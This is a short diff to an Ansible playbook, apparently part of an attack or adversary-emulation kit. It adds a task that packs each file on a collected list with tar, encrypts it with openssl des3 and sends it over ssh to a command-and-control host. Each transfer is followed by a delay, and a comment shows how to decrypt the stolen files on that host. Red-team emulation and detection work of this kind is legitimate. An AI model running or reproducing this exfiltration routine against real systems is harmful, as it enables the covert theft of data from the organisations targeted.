@@ -23,3 +23,13 @@
       register: exfil_files_list
     - debug:
         var: "exfil_files_list.stdout_lines"
+        
+    - name: exfl over SSH
+      tags: always 
+      shell: |
+        pwd > /tmp/path
+        cd {{ exfiltration_folder }}
+        tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
+        sleep {{ exfil_delay }}
+      with_items: "{{ exfil_files_list.stdout_lines }}"
+# decrypt file on cnc: openssl des3 -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
